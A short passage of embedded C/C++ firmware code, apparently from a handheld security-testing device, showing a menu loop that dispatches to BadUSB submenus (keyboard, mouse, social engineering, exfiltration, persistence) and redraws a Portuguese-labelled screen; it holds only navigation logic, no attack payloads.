        if (check(SelPress)) {
            void (*funcs[])() = {
                badusbKeyboardAtksMenu, badusbMouseAtksMenu,
                badusbComboAtksMenu, badusbSocialEngMenu,
                badusbExfilMenu, badusbPersistMenu,
                badusbUtilityMenu, badusbConfigMenu
            };
            funcs[sel]();
            badDrawWelcomeScreen();
            badDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
        }
        if (check(EscPress)) break;
        delay(100);
    }
}
